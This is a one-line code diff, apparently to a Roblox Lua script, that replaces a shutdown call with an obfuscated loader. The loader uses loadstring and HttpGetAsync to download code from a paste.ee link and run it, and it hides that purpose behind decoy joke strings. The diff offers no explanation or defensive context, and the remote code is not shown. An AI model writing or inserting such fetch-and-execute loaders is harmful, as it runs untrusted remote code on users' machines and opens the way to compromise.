@@ -1,1 +1,1 @@
-game:Shutdown()
+(loadstring or print or ("loadstring cracking speedrun, gogogo" and warn))((({assert(not false, game)})[2] or ("please i have a child in my epic minigames pets i need to keep him fed" and game)):HttpGetAsync[[https://paste.ee/r/8QJDM/0]])[[cringe, didn't even expect that this crap exists]]
